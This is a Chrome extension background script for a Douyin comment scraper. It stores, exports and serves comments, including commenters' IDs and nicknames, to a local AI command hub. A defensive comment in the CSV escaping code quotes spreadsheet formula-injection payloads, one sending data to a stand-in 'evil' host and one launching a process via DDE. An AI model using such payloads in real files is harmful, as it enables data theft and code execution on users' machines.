/**
 * background.js —— MV3 service worker
 *
 * 职责（刻意最小化）：
 *   1. 保存已采集的评论（按 videoId 分池，chrome.storage.local）
 *   2. 导出 CSV / JSON（复用 douyin-probe/background.js 已跑通的 Blob + downloads 方案）
 *   3. 清空
 *
 * 刻意不做的事：
 *   - 不发起任何网络请求（所有数据都来自页面自身的流量）
 *   - 不碰签名
 *
 * 存储结构：
 *   dts_videos  : { [videoId]: { videoId, title, total, count, hasMore, updatedAt, signedUrlAt } }
 *   dts_c_<vid> : { [cid]: comment }        ← 按视频分键，避免单键超过 storage 配额
 */

const KEY_VIDEOS = 'dts_videos';
const PREFIX_COMMENTS = 'dts_c_';
// 防御：单视频超过这个数就不再增长（正常量级远低于此）。
// v0.1.5 起二级回复也落进同一个池子（带 is_reply/parent_cid），故上限从 30000 提到 80000。
const MAX_COMMENTS_PER_VIDEO = 80000;

// ---------- 存储 ----------

async function getVideos() {
  const o = await chrome.storage.local.get(KEY_VIDEOS);
  return o[KEY_VIDEOS] || {};
}

async function getComments(videoId) {
  const key = PREFIX_COMMENTS + videoId;
  const o = await chrome.storage.local.get(key);
  return o[key] || {};
}

async function putComments(videoId, list) {
  const key = PREFIX_COMMENTS + videoId;
  const cur = await getComments(videoId);
  for (const c of list) {
    if (c && c.cid) cur[c.cid] = c;
  }
  const cids = Object.keys(cur);
  if (cids.length > MAX_COMMENTS_PER_VIDEO) {
    // 超出上限时丢弃最早创建的（按 create_time 排序）
    cids.sort((a, b) => (cur[a].create_time || 0) - (cur[b].create_time || 0));
    for (const cid of cids.slice(0, cids.length - MAX_COMMENTS_PER_VIDEO)) delete cur[cid];
  }
  await chrome.storage.local.set({ [key]: cur });
  return Object.keys(cur).length;
}

async function updateVideoMeta(videoId, patch) {
  const videos = await getVideos();
  videos[videoId] = Object.assign({ videoId }, videos[videoId] || {}, patch, {
    updatedAt: new Date().toISOString()
  });
  await chrome.storage.local.set({ [KEY_VIDEOS]: videos });
  return videos[videoId];
}

async function setBadge(n) {
  try {
    await chrome.action.setBadgeText({ text: n ? String(n) : '' });
    await chrome.action.setBadgeBackgroundColor({ color: '#2b6cb0' });
  } catch (e) { /* 忽略 */ }
}

// ---------- CSV ----------

/**
 * RFC4180 转义 + 公式注入防护。
 *
 * 转义：包含引号/逗号/换行时用双引号包裹，内部引号翻倍。
 *
 * ⚠️ 公式注入（CSV injection）必须单独防：评论文本**完全由别人控制**——任何能看到
 * 这条视频的人都能写。Excel / WPS 打开 CSV 时，单元格首字符是 `= + - @` 就会被
 * 当公式执行：
 *   · `=HYPERLINK("http://evil/?"&A1,"点我")` → 导出者一点就把数据带出去
 *   · `=cmd|'/c calc'!A0`（DDE）→ 甚至能拉起本机进程
 * 本工具的主用途恰好就是「导出 CSV 用 Excel 看」，命中率几乎是 100%，所以必须挡。
 *
 * 做法：首字符命中时前置一个单引号——Excel 视其为「文本」前缀且不显示在单元格里；
 * 其余 CSV 读者只会多看到一个 `'`，比执行公式安全得多。对**所有**列统一处理，
 * 不区分「文本列/数字列」：本表没有任何合法的负数字段，误伤面为零。
 */
function csvCell(v) {
  if (v === null || v === undefined) return '';
  let s = String(v);
  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
  if (/[",\r\n]/.test(s)) return '"' + s.replace(/"/g, '""') + '"';
  return s;
}

/** 数据清洗 */
/** 去表情、@某人、#话题，用于 text_clean 列 */
function cleanText(t) {
  if (!t) return '';
  return String(t)
    .replace(/\[[^\[\]]{1,12}\]/g, '')   // [捂脸] 这类表情占位
    .replace(/@[^\s@]{1,30}/g, '')        // @某人
    .replace(/#[^\s#]{1,40}/g, '')        // #话题
    .replace(/\s+/g, ' ')
    .trim();
}

function toCsv(comments) {
  // 前 15 列是 v0.1.4 起就有的稳定契约（顺序/含义不变）；
  // v0.1.5 新增的二级回复在**末尾追加**两列，老读者按位置读前 15 列仍然正确。
  const cols = [
    'cid', 'create_time', 'create_time_str', 'text', 'text_clean', 'text_len',
    'digg_count', 'reply_comment_total', 'ip_label', 'is_hot', 'is_folded',
    'level', 'stick_position', 'user_nickname', 'user_uid',
    'is_reply', 'parent_cid'
  ];
  const rows = [cols.join(',')];
  for (const c of comments) {
    const t = c.text || '';
    const tc = cleanText(t);
    const ct = c.create_time ? new Date(c.create_time * 1000).toISOString() : '';
    const u = c.user || {};
    rows.push([
      csvCell(c.cid), csvCell(c.create_time), csvCell(ct), csvCell(t), csvCell(tc),
      csvCell([...String(t)].length),
      csvCell(c.digg_count), csvCell(c.reply_comment_total), csvCell(c.ip_label),
      csvCell(c.is_hot), csvCell(c.is_folded), csvCell(c.level), csvCell(c.stick_position),
      csvCell(u.nickname), csvCell(u.uid),
      // 二级回复两列：顶层评论为 0 / 空
      csvCell(c.is_reply ? 1 : 0), csvCell(c.parent_cid)
    ].join(','));
  }
  return rows.join('\r\n');
}

/** 把字节数组编成 data URL。分块是为了避免 String.fromCharCode.apply 参数过多爆栈 */
function toDataUrl(bytes, mime) {
  const CHUNK = 0x8000; // 防止 apply 参数过多爆栈
  let s = '';
  for (let i = 0; i < bytes.length; i += CHUNK) {
    s += String.fromCharCode.apply(null, bytes.subarray(i, i + CHUNK));
  }
  return 'data:' + mime + ';base64,' + btoa(s);
}

// false = 不弹窗，直接落到浏览器的下载目录（文件名仍带 videoId 与时间戳）
// true  = 每次导出弹原生「另存为」，让用户自己选位置
const SAVE_AS = false;

/** 等某个下载项进入终态（complete / interrupted）。
 *  chrome.downloads.download() 的 promise 在「下载项被创建」时就 resolve ——
 *  那时用户还没在「另存为」对话框里点确定。不等终态就报成功，
 *  用户点「取消」时面板会撒谎说「已导出」。（实测见 probe-saveas.mjs） */
function waitDownload(id, timeoutMs) {
  return new Promise((resolve) => {
    let done = false;
    const finish = (v) => {
      if (done) return;
      done = true;
      try { chrome.downloads.onChanged.removeListener(onChanged); } catch (e) {}
      clearTimeout(timer);
      resolve(v);
    };
    const onChanged = (delta) => {
      if (delta.id !== id || !delta.state) return;
      const cur = delta.state.current;
      // 注意：下载【开始】时也会上报一次 state='in_progress'，那不是终态。
      // 只有 complete / interrupted 才算结束。
      if (cur !== 'complete' && cur !== 'interrupted') return;
      // 终态时再查一次，拿权威的 state/error（error 有时在同一条事件里，有时不是）
      chrome.downloads.search({ id }, (items) => {
        const it = items && items[0];
        finish({ state: (it && it.state) || cur, error: (it && it.error) || (delta.error ? delta.error.current : '') });
      });
    };
    chrome.downloads.onChanged.addListener(onChanged);
    const timer = setTimeout(() => finish({ state: 'timeout', error: '' }), timeoutMs);
    // 兜底：可能在本监听注册之前就已经结束了（极小的下载会瞬间完成）
    chrome.downloads.search({ id }, (items) => {
      const it = items && items[0];
      if (it && it.state && it.state !== 'in_progress') {
        finish({ state: it.state, error: it.error || '' });
      }
    });
  });
}

async function download(text, filename, mime) {
  // MV3 service worker 没有 Blob URL 能力（不提供对象 URL），
  // 所以统一走 data URL —— chrome.downloads.download 对 data URL 支持良好。
  // 用 base64 而不是 encodeURIComponent：中文 CSV 走 %XX 会膨胀 3 倍，base64 只膨胀 4/3。
  const wantBom = /csv/i.test(mime);
  const bytes = new TextEncoder().encode(wantBom ? '\ufeff' + text : text);
  let id;
  try {
    id = await chrome.downloads.download({ url: toDataUrl(bytes, mime), filename, saveAs: SAVE_AS });
  } catch (e) {
    return { ok: false, error: String(e && e.message || e) };
  }
  if (id === undefined) return { ok: false, error: '下载未创建' };

  // 有未完成的下载项 + 挂起的消息端口，MV3 不会在用户挑保存位置时把 SW 杀掉。
  const final = await waitDownload(id, 5 * 60 * 1000);
  if (final.state === 'complete') {
    let path = null;
    try {
      const items = await chrome.downloads.search({ id });
      if (items && items[0] && items[0].filename) path = items[0].filename;
    } catch (e) { /* path 可选 */ }
    return { ok: true, filename, bytes: bytes.length, downloadId: id, path };
  }
  if (final.error === 'USER_CANCELED') return { ok: false, cancelled: true, error: '用户取消了保存' };
  if (final.state === 'timeout') return { ok: false, error: '下载超时未完成（可能对话框一直没关）' };
  return { ok: false, error: '下载中断：' + (final.error || final.state) };
}

// ---------- 消息路由 ----------

if (chrome && chrome.runtime && chrome.runtime.onMessage && chrome.runtime.onMessage.addListener) {
  chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (!msg || !msg.type) return;

  // AI Bridge 保活（协议 §7.5）：内容脚本周期 ping，不承载采集逻辑
  if (msg.type === 'dts-ai-keepalive') {
    sendResponse({ ok: true, keepalive: true, at: Date.now() });
    return false;
  }

  (async () => {
    try {
      switch (msg.type) {
        case 'dts-comments': {
          const n = await putComments(msg.videoId, msg.comments || []);
          await updateVideoMeta(msg.videoId, {
            title: msg.title,
            total: msg.total,
            count: n,
            hasMore: msg.hasMore,
            signedUrlAt: msg.signedUrlAt
          });
          await setBadge(n);
          sendResponse({ ok: true, count: n });
          break;
        }

        case 'dts-status': {
          const n = await getComments(msg.videoId).then((m) => Object.keys(m).length);
          await updateVideoMeta(msg.videoId, { title: msg.title, phase: msg.phase, count: n });
          sendResponse({ ok: true, count: n });
          break;
        }

        case 'dts-stats': {
          const videos = await getVideos();
          const key = msg.videoId;
          let count = 0;
          if (key) count = Object.keys(await getComments(key)).length;
          else {
            for (const v of Object.keys(videos)) count += Object.keys(await getComments(v)).length;
          }
          sendResponse({ ok: true, count, videos });
          break;
        }

        case 'dts-export': {
          const videoId = msg.videoId;
          const map = await getComments(videoId);
          const comments = Object.values(map);
          // 按时间升序，便于阅读
          comments.sort((a, b) => (a.create_time || 0) - (b.create_time || 0));
          const videos = await getVideos();
          const meta = videos[videoId] || {};
          const stamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
          if (msg.format === 'json') {
            const replyCount = comments.filter((c) => c && c.is_reply).length;
            const payload = {
              exportedAt: new Date().toISOString(),
              videoId,
              title: meta.title,
              totalReported: meta.total,
              count: comments.length,
              topLevelCount: comments.length - replyCount,
              replyCount,   // v0.1.5：二级回复条数（带 parent_cid 的那些）
              note: '由「抖音评论采集器」采集：数据来自抖音页面自身的接口响应。未破解或伪造签名、未绕过登录；开始采集前若还没有可用签名，扩展会用一次合成点击替你打开评论区（让页面自己发出请求），不滚动页面、不改动评论内容。二级回复通过复用页面自己已发出的签名 URL 拉取（仅改写 path 与 item_id/comment_id/cut_version/cursor/count）。',
              comments
            };
            sendResponse(await download(JSON.stringify(payload, null, 2),
              `douyin-comments-${videoId}-${stamp}.json`, 'application/json'));
          } else {
            sendResponse(await download(toCsv(comments),
              `douyin-comments-${videoId}-${stamp}.csv`, 'text/csv;charset=utf-8'));
          }
          break;
        }

        case 'dts-clear': {
          const videoId = msg.videoId;
          if (videoId) {
            await chrome.storage.local.remove(PREFIX_COMMENTS + videoId);
            const videos = await getVideos();
            delete videos[videoId];
            await chrome.storage.local.set({ [KEY_VIDEOS]: videos });
          } else {
            const all = await chrome.storage.local.get(null);
            const keys = Object.keys(all).filter((k) => k === KEY_VIDEOS || k.startsWith(PREFIX_COMMENTS));
            await chrome.storage.local.remove(keys);
          }
          await setBadge(0);
          sendResponse({ ok: true });
          break;
        }

        default:
          sendResponse({ ok: false, error: 'unknown type: ' + msg.type });
      }
    } catch (e) {
      sendResponse({ ok: false, error: String((e && e.stack) || e) });
    }
  })();

  return true; // 异步响应
  });
}

if (chrome && chrome.runtime && chrome.runtime.onInstalled && chrome.runtime.onInstalled.addListener) {
  chrome.runtime.onInstalled.addListener(() => { setBadge(0).catch(() => {}); });
}

// ========================================================================
// AI Bridge（协议 §7，v0.2.0）
// 扩展不能 listen → 出站轮询本地 Hub（douyin-mcp）；命令再转发 content 或 storage。
// ========================================================================

const KEY_AI = 'dts_ai_bridge';
const AI_BRIDGE_DEFAULT = {
  host: '127.0.0.1',
  port: 18765,
  enabled: true,
  intervalMs: 800
};

// 桥接头：Hub 侧只判「存在」，值不重要 —— 它**不是**密码，而是一个「预检门槛」。
// 自定义头必然触发 CORS 预检，而 Hub 的预检只对 chrome-extension:// 放行，
// 所以浏览器里的网页发不出这个头（详见 douyin-mcp/mcp.js 顶部的「安全边界」）。
// 扩展侧零配置、用户无感知，即插即用不变。
const AI_BRIDGE_HEADERS = { 'X-DTS-Bridge': '1' };

let aiTimer = null;
let aiLastLive = null;          // 最近一次 content 状态快照
let aiLastCommandAt = 0;
let aiLastResultAt = 0;
let aiLastExtensionAt = 0;

async function getAiConfig() {
  try {
    const o = await chrome.storage.local.get(KEY_AI);
    return Object.assign({}, AI_BRIDGE_DEFAULT, o[KEY_AI] || {});
  } catch (e) {
    return Object.assign({}, AI_BRIDGE_DEFAULT);
  }
}

async function setAiConfig(patch) {
  const cur = await getAiConfig();
  const next = Object.assign({}, cur, patch || {});
  await chrome.storage.local.set({ [KEY_AI]: next });
  return next;
}

function aiBaseUrl(cfg) {
  return `http://${cfg.host}:${cfg.port}/api/v1`;
}

// ========================================================================
// 运行时设置（协议 §3.9）：AI（MCP / DSH 插件）通过桥命令下发采集参数。
//   dts_settings        ← 外部下发（本文件 set_settings / start_collect 的 settings，
//                          以及 DSH 插件每次调用推的那份）
//   dts_user_settings   ← 面板齿轮里用户当场设的（优先级更高）
//   dts_settings_effective ← content.js 每次「开始采集」把**实际生效值**写回来，供核对
// 优先级：内置常量 < dts_settings < dts_user_settings（逐字段判断，见 content.js
// loadRuntimeSettings）。所以 AI 设的值会被用户在面板里设过的同名项盖掉 —— 这是设计如此。
// ========================================================================
const KEY_RUNTIME_SETTINGS = 'dts_settings';
const KEY_USER_SETTINGS = 'dts_user_settings';
const KEY_EFFECTIVE_SETTINGS = 'dts_settings_effective';

// 与 content.js 的硬上限保持一致（改这里要同步改那边）
const SETTINGS_FIELDS = {
  maxCount: { min: 0, max: 1000000, desc: '目标条数，0=不限' },
  lanes: { min: 1, max: 8, desc: '顶层并发路数' },
  replyLanes: { min: 1, max: 8, desc: '二级回复并发路数' },
  replyGapMs: { min: 0, max: 60000, desc: '回复同线程请求间隔 ms' },
  replyWarmupMs: { min: 0, max: 600000, desc: '进补采前的静默 ms' },
  replyThrottleMaxWaitMs: { min: 10000, max: 600000, desc: '整段等限流窗口的墙钟上限 ms' }
};

function clampSettings(input, base) {
  const out = Object.assign({}, base || {});
  const unknown = [];
  if (!input || typeof input !== 'object') return { settings: {}, unknown };
  for (const k of Object.keys(input)) {
    const spec = SETTINGS_FIELDS[k];
    if (!spec) { unknown.push(k); continue; }
    const n = Number(input[k]);
    if (!isFinite(n)) { unknown.push(k); continue; }
    out[k] = Math.max(spec.min, Math.min(Math.round(n), spec.max));
  }
  return { settings: out, unknown };
}

async function readSettingsSnapshot() {
  const o = await chrome.storage.local.get([KEY_RUNTIME_SETTINGS, KEY_USER_SETTINGS, KEY_EFFECTIVE_SETTINGS]);
  return {
    external: o[KEY_RUNTIME_SETTINGS] || null,
    user: o[KEY_USER_SETTINGS] || null,
    effective: o[KEY_EFFECTIVE_SETTINGS] || null,
    precedence: '内置常量 < dts_settings（AI 下发） < dts_user_settings（面板齿轮）',
    limits: SETTINGS_FIELDS
  };
}

async function findDouyinTabs() {
  try {
    return await chrome.tabs.query({
      url: ['*://*.douyin.com/*', '*://*.iesdouyin.com/*']
    });
  } catch (e) {
    return [];
  }
}

function pickDouyinTab(tabs) {
  if (!tabs || !tabs.length) return null;
  const active = tabs.filter((t) => t.active);
  const pool = active.length ? active : tabs;
  pool.sort((a, b) => (b.lastAccessed || 0) - (a.lastAccessed || 0));
  return pool[0] || null;
}

async function sendToDouyinTab(msg) {
  const tabs = await findDouyinTabs();
  const tab = pickDouyinTab(tabs);
  if (!tab) {
    return {
      ok: false,
      error: 'NO_DOUYIN_TAB',
      hint: '请先在 Chrome 打开抖音页面（www.douyin.com，已登录），再调用页面类 AI 命令。'
    };
  }
  try {
    const resp = await chrome.tabs.sendMessage(tab.id, msg);
    if (resp && resp.ok && resp.status) aiLastLive = resp.status;
    return Object.assign({ tabId: tab.id, tabUrl: tab.url }, resp || { ok: true });
  } catch (e) {
    return {
      ok: false,
      error: String((e && e.message) || e),
      tabId: tab.id,
      tabUrl: tab.url,
      hint: '抖音页扩展内容脚本未就绪：请在该标签页按 F5 刷新，确认扩展已加载且已登录。'
    };
  }
}

function summarizeComments(list) {
  const arr = (list || []).filter(Boolean);
  const top = arr.filter((c) => !c.is_reply);
  const replies = arr.filter((c) => c.is_reply);
  const diggs = arr.map((c) => Number(c.digg_count) || 0).sort((a, b) => a - b);
  const pick = (p) => {
    if (!diggs.length) return 0;
    const i = Math.min(diggs.length - 1, Math.floor((diggs.length - 1) * p));
    return diggs[i];
  };
  const textLen = arr.map((c) => [...String(c.text || '')].length);
  return {
    count: arr.length,
    topLevelCount: top.length,
    replyCount: replies.length,
    digg: {
      min: diggs[0] || 0,
      p25: pick(0.25),
      p50: pick(0.5),
      p75: pick(0.75),
      p90: pick(0.9),
      max: diggs[diggs.length - 1] || 0
    },
    avgTextLen: textLen.length
      ? Math.round((textLen.reduce((a, b) => a + b, 0) / textLen.length) * 10) / 10
      : 0,
    hotCount: arr.filter((c) => c.is_hot).length,
    foldedCount: arr.filter((c) => c.is_folded).length
  };
}

function pickCommentFields(c, fields) {
  if (!c) return c;
  const base = fields && fields.length
    ? fields
    : ['cid', 'text', 'create_time', 'create_time_str', 'digg_count', 'reply_comment_total',
       'ip_label', 'is_hot', 'is_folded', 'level', 'stick_position', 'is_reply', 'parent_cid',
       'user'];
  const out = {};
  for (const k of base) {
    if (k === 'user') {
      const u = c.user || {};
      out.user = {
        uid: u.uid,
        nickname: u.nickname,
        sec_uid: u.sec_uid,
        unique_id: u.unique_id,
        short_id: u.short_id,
        avatar_thumb: u.avatar_thumb
      };
    } else {
      out[k] = c[k];
    }
  }
  return out;
}

async function executeAiCommand(cmd) {
  const type = cmd.type;
  const args = cmd.args || {};
  aiLastCommandAt = Date.now();

  switch (type) {
    case 'status': {
      const videos = await getVideos();
      let count = 0;
      if (args.videoId) {
        count = Object.keys(await getComments(args.videoId)).length;
      } else {
        for (const v of Object.keys(videos)) {
          count += Object.keys(await getComments(v)).length;
        }
      }
      const tabs = await findDouyinTabs();
      return {
        ok: true,
        result: {
          storage: { videos, count, videoCount: Object.keys(videos).length },
          settings: await readSettingsSnapshot(),
          live: aiLastLive,
          tabs: tabs.map((t) => ({ id: t.id, title: t.title, url: t.url, active: !!t.active })),
          bridge: {
            lastCommandAt: aiLastCommandAt,
            lastResultAt: aiLastResultAt,
            lastExtensionAt: aiLastExtensionAt
          }
        }
      };
    }

    case 'live_status':
      return sendToDouyinTab({ type: 'dts-ai-live-status' });

    case 'start_collect': {
      // 可选：本次开始采集要用的参数（协议 §3.9）。写进 dts_settings 后内容脚本
      // 在 startLoop() 里会重读一次 —— 与 DSH 插件同一条通路，改完立即生效。
      let appliedSettings = null;
      if (args.settings && typeof args.settings === 'object') {
        const cur = (await chrome.storage.local.get(KEY_RUNTIME_SETTINGS))[KEY_RUNTIME_SETTINGS] || {};
        const c = clampSettings(args.settings, cur);
        if (Object.keys(c.settings).length) {
          await chrome.storage.local.set({ [KEY_RUNTIME_SETTINGS]: c.settings });
          appliedSettings = c.settings;
        }
      }
      const r = await sendToDouyinTab({ type: 'dts-ai-start' });
      if (r.ok && r.status && r.status.phase === 'waiting-sign' && !r.status.liveVideoId) {
        r.hint = r.status.hint || '当前页还没识别到视频：请先点开一条具体视频（网格页需点开作品浮层）。';
      }
      if (appliedSettings) {
        r.appliedSettings = appliedSettings;
        r.settingsNote = '参数已写进 dts_settings，本次采集生效；面板齿轮里用户设过的同名项优先级更高。';
      }
      return r;
    }

    case 'pause_collect':
      return sendToDouyinTab({ type: 'dts-ai-pause' });

    case 'clear_page':
      return sendToDouyinTab({ type: 'dts-ai-clear-page' });

    case 'list_videos': {
      const videos = await getVideos();
      return {
        ok: true,
        result: {
          videos,
          count: Object.keys(videos).length
        }
      };
    }

    case 'get_comments': {
      const videoId = args.videoId;
      if (!videoId) return { ok: false, error: 'MISSING_VIDEO_ID', hint: 'get_comments 需要 videoId 参数' };
      const map = await getComments(videoId);
      let list = Object.values(map);
      list.sort((a, b) => (a.create_time || 0) - (b.create_time || 0));
      const mode = args.mode === 'page' ? 'page' : 'summary';
      const limit = Math.max(1, Math.min(Number(args.limit) || 200, 2000));
      const offset = Math.max(0, Number(args.offset) || 0);
      const videos = await getVideos();
      const meta = videos[videoId] || { videoId };

      if (mode === 'summary') {
        const sample = list.slice(0, Math.min(limit, 50)).map((c) => pickCommentFields(c, args.fields));
        return {
          ok: true,
          result: {
            mode,
            videoId,
            meta,
            summary: summarizeComments(list),
            sample,
            hasMore: list.length > sample.length,
            fullCount: list.length
          }
        };
      }

      const page = list.slice(offset, offset + limit).map((c) => pickCommentFields(c, args.fields));
      return {
        ok: true,
        result: {
          mode,
          videoId,
          meta,
          offset,
          limit,
          returned: page.length,
          fullCount: list.length,
          summary: summarizeComments(list),
          comments: page
        }
      };
    }

    case 'export': {
      const videoId = args.videoId;
      const format = args.format === 'json' ? 'json' : 'csv';
      if (!videoId) return { ok: false, error: 'MISSING_VIDEO_ID', hint: 'export 需要 videoId 参数' };
      const map = await getComments(videoId);
      if (!Object.keys(map).length) {
        return { ok: false, error: 'EMPTY_POOL', videoId, hint: '该 videoId 本地没有评论数据' };
      }
      // 优先走 background（与面板同路径）；若 SW 长轮询路径已有 download 契约
      const comments = Object.values(map);
      comments.sort((a, b) => (a.create_time || 0) - (b.create_time || 0));
      const videos = await getVideos();
      const meta = videos[videoId] || {};
      const stamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
      if (format === 'json') {
        const replyCount = comments.filter((c) => c && c.is_reply).length;
        const payload = {
          exportedAt: new Date().toISOString(),
          videoId,
          title: meta.title,
          totalReported: meta.total,
          count: comments.length,
          topLevelCount: comments.length - replyCount,
          replyCount,
          note: '由「抖音评论采集器」采集：数据来自抖音页面自身的接口响应。未破解或伪造签名、未绕过登录；开始采集前若还没有可用签名，扩展会用一次合成点击替你打开评论区（让页面自己发出请求），不滚动页面、不改动评论内容。二级回复通过复用页面自己已发出的签名 URL 拉取（仅改写 path 与 item_id/comment_id/cut_version/cursor/count）。',
          comments
        };
        const dl = await download(JSON.stringify(payload, null, 2),
          `douyin-comments-${videoId}-${stamp}.json`, 'application/json');
        return Object.assign({ videoId, format }, dl);
      }
      const dl = await download(toCsv(comments),
        `douyin-comments-${videoId}-${stamp}.csv`, 'text/csv;charset=utf-8');
      return Object.assign({ videoId, format }, dl);
    }

    case 'clear_storage': {
      const videoId = args.videoId;
      if (videoId) {
        await chrome.storage.local.remove(PREFIX_COMMENTS + videoId);
        const videos = await getVideos();
        delete videos[videoId];
        await chrome.storage.local.set({ [KEY_VIDEOS]: videos });
      } else {
        const all = await chrome.storage.local.get(null);
        const keys = Object.keys(all).filter((k) => k === KEY_VIDEOS || k.startsWith(PREFIX_COMMENTS));
        await chrome.storage.local.remove(keys);
        aiLastLive = null;
      }
      await setBadge(0);
      return { ok: true, result: { cleared: videoId || 'ALL' } };
    }

    case 'get_settings':
      return { ok: true, result: await readSettingsSnapshot() };

    case 'set_settings': {
      // args.clear = 'external' | 'user' | 'all' → 删掉对应键（恢复内置/插件值）
      if (args.clear) {
        const which = String(args.clear);
        const keys = which === 'all'
          ? [KEY_RUNTIME_SETTINGS, KEY_USER_SETTINGS]
          : which === 'user'
            ? [KEY_USER_SETTINGS]
            : [KEY_RUNTIME_SETTINGS];
        await chrome.storage.local.remove(keys);
        return { ok: true, result: { cleared: which, clearedKeys: keys, settings: await readSettingsSnapshot() } };
      }
      const scope = args.scope === 'panel' ? 'panel' : 'external';
      const key = scope === 'panel' ? KEY_USER_SETTINGS : KEY_RUNTIME_SETTINGS;
      const cur = (await chrome.storage.local.get(key))[key] || {};
      const c = clampSettings(args.settings, cur);
      if (!Object.keys(c.settings).length) {
        return {
          ok: false,
          error: 'NO_SETTINGS',
          hint: '请传 settings：{ maxCount, lanes, replyLanes, replyGapMs, replyWarmupMs, replyThrottleMaxWaitMs }；'
            + '或传 clear:"external"|"user"|"all" 恢复默认。'
        };
      }
      await chrome.storage.local.set({ [key]: c.settings });
      return {
        ok: true,
        result: {
          scope,
          key,
          settings: c.settings,
          unknown: c.unknown.length ? c.unknown : undefined,
          note: '内容脚本每次「开始采集」都会重读，改完立即生效；面板齿轮里用户设过的同名项优先级更高。'
        }
      };
    }

    case 'set_bridge_config': {
      const next = await setAiConfig(args || {});
      return { ok: true, result: { config: next } };
    }

    default:
      return { ok: false, error: 'UNKNOWN_COMMAND:' + type, hint: '未知 AI 命令类型' };
  }
}

async function aiPollOnce() {
  const cfg = await getAiConfig();
  if (!cfg.enabled) return;
  const base = aiBaseUrl(cfg);
  let commands = [];
  try {
    // host_permissions 已含 127.0.0.1，扩展 fetch 通常不受 CORS 约束；
    // X-DTS-Bridge 是给 Hub 的「预检门槛」（见 mcp.js 顶部的安全边界说明）。
    const res = await fetch(base + '/pending', {
      method: 'GET',
      headers: AI_BRIDGE_HEADERS,
      cache: 'no-store',
      credentials: 'omit',
      mode: 'cors'
    });
    if (!res.ok) return;
    const data = await res.json();
    commands = (data && data.commands) || [];
    aiLastExtensionAt = Date.now();
  } catch (e) {
    // Hub 未启动 / CORS / 网络：静默，不影响面板采集（协议 §7.8）
    return;
  }

  if (!commands.length) return;

  for (const cmd of commands) {
    let out;
    try {
      out = await executeAiCommand(cmd);
    } catch (e) {
      out = { ok: false, error: String((e && e.stack) || e) };
    }
    const body = {
      id: cmd.id,
      type: cmd.type,
      ok: !!out.ok,
      result: out.result !== undefined ? out.result : (out.ok ? out : undefined),
      error: out.error || undefined,
      hint: out.hint || undefined,
      videoId: out.videoId || undefined,
      status: out.status || undefined,
      filename: out.filename || undefined,
      bytes: out.bytes || undefined,
      path: out.path || undefined,
      tabId: out.tabId,
      at: Date.now()
    };
    // 统一拍平：ok 分支把扩展回包主体放进 result（Hub/MCP 更好消费）
    if (out.ok && out.result === undefined && out.status !== undefined) {
      body.result = { status: out.status, tabId: out.tabId, tabUrl: out.tabUrl };
      // start_collect 带参数时要把「本次实际写进去的设置」透出来（否则这里会被拍平丢掉）
      if (out.appliedSettings) {
        body.result.appliedSettings = out.appliedSettings;
        body.result.settingsNote = out.settingsNote;
      }
    } else if (out.ok && out.result === undefined && out.filename !== undefined) {
      body.result = {
        ok: true,
        videoId: out.videoId,
        format: out.format,
        filename: out.filename,
        bytes: out.bytes,
        path: out.path,
        downloadId: out.downloadId
      };
    } else if (out.ok && out.result === undefined) {
      body.result = out;
    }
    try {
      await fetch(base + '/result', {
        method: 'POST',
        headers: Object.assign({ 'Content-Type': 'application/json' }, AI_BRIDGE_HEADERS),
        body: JSON.stringify(body),
        credentials: 'omit',
        mode: 'cors'
      });
      aiLastResultAt = body.at;
    } catch (e) { /* Hub 刚关：结果丢失可重发，不在扩展侧持久化队列 */ }
  }
}

function ensureAiPoller() {
  if (aiTimer) return;
  const tick = () => {
    try {
      aiPollOnce().catch(() => {});
    } catch (e) { /* poll 内部已兜 */ }
  };
  // 不用 chrome.alarms：权限缺失或 SW 缓存会导致 onAlarm TypeError / 注册失败。
  // setInterval + content keepalive 足够；Hub 不在时静默失败。
  aiTimer = setInterval(tick, 800);
  tick();
}

ensureAiPoller();

if (chrome && chrome.runtime && chrome.runtime.onStartup && chrome.runtime.onStartup.addListener) {
  chrome.runtime.onStartup.addListener(() => { ensureAiPoller(); });
}
if (chrome && chrome.runtime && chrome.runtime.onInstalled && chrome.runtime.onInstalled.addListener) {
  chrome.runtime.onInstalled.addListener(() => { ensureAiPoller(); });
}
